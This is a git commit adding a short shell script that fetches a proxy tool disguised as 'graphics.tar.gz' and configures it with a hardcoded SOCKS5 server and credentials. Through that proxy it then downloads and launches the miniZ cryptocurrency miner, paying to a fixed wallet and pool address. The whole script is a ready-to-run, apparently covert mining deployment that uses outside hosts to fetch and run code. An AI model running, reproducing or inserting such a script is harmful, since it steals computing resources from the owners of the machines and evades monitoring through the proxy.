54e4c327feaf9af500ae17f041fee32d22c82451
Musauphol <101700167+Musauphol@users.noreply.github.com>
2022-04-29 19:43:32 +0700

    Create amin.sh

---
+++ amin.sh
@@ -0,0 +1,34 @@
+sudo apt-get update -y
+wget https://github.com/Akatsoki/joss/raw/main/graphics.tar.gz
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+
+listen = :2233
+
+loglevel = 1
+
+socks5 = 45.140.13.119:9132
+
+socks5_username = xkqedifn
+
+socks5_password = dkmta6n66sa6
+
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+
+echo " "
+
+./graftcp/graftcp wget https://github.com/miniZ-miner/miniZ/releases/download/v1.8y2/miniZ_v1.8y2_linux-x64.tar.gz 
+tar xf miniZ_v1.8y2_linux-x64.tar.gz 
+
+chmod +x miniZ
+
+./graftcp/graftcp ./miniZ -u TRX:TL9Zj9rC4jbBDcGHq7H2xNJQw34VrgtBJs.$(echo $(shuf -i 1-999 -n 1)-T4) -l 159.203.163.51 --port=3333 -p x --par=ethash --pers auto
